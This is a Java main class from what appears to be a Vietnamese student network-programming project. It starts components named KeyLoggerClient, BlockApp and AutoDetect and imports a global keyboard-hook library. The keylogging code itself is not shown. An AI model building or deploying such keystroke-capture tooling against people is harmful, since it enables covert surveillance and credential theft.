/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ltm;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import java.time.format.DateTimeFormatter;
import java.time.LocalDateTime;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class LapTrinhMang {

    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm:ss");
    LocalDateTime now = LocalDateTime.now();

    public static void main(String[] args) {

        KeyLoggerClient klc = new KeyLoggerClient();
        BlockApp ba = new BlockApp();
        AutoDetect ad = new AutoDetect();
        Coppypate cp = new Coppypate();
//viet nam tuoi dep
//dao van thnag

        ad.run();
        klc.run();
        ba.run();
    }
    
}
